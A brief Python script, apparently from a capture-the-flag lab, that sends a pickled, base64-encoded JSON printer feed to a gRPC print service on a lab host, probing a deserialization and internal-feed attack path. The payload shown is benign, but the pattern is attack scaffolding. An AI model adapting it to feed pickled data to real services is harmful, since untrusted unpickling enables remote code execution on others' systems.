import grpc
import service_pb2
import service_pb2_grpc
import requests
import pickle
import os
from base64 import b64encode


def gen_payload():
    json = '''{
        "version": "v1.0",
        "title": "Printer Feed",
        "home_page_url": "http://printer.laserinternal.htb/",
        "feed_url": "http://printer.laserinternal.htb/feeds.json",
        "items": [{"id": "2", "content_text": "Queue jobs"},
                  {"id": "1", "content_text": "Failed items"}]


    }'''
    return json


channel = grpc.insecure_channel('10.10.10.201:9000')
stub = service_pb2_grpc.PrintStub(channel)
payload = pickle.dumps(gen_payload())
response = stub.Feed(service_pb2.Contents(data=b64encode(payload)))
